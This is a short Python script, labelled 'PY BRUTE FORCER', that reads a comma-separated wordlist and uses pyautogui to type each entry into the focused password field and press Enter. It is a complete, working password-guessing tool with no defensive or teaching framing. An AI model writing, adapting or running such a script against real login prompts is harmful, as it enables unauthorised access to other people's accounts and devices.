#libraries that are required
import datetime
import time
import pyautogui
import os
print('__________PY BRUTE FORCER____________')
time.sleep(1)
def textprompt():
	x = pyautogui.confirm('Click OK to begin then Enter that Path of Wordlist and click in the password field.Click Cancel to Exit.')
	if x == 'Cancel':
		exit()
	else:
		s = input('Enter the Wordlist Path: ')
		passcrack(s)

def passcrack(file_name):
	word_file = open(file_name,'r')
	words = word_file.read()
	word_file.close()
	word_list = words.split(',')
	time.sleep(10)
	for word in word_list[0::]:
			pyautogui.hotkey('ctrl','a')
			pyautogui.typewrite(word, interval=0.0001)
			pyautogui.typewrite(['enter'])
			print(word)

textprompt()
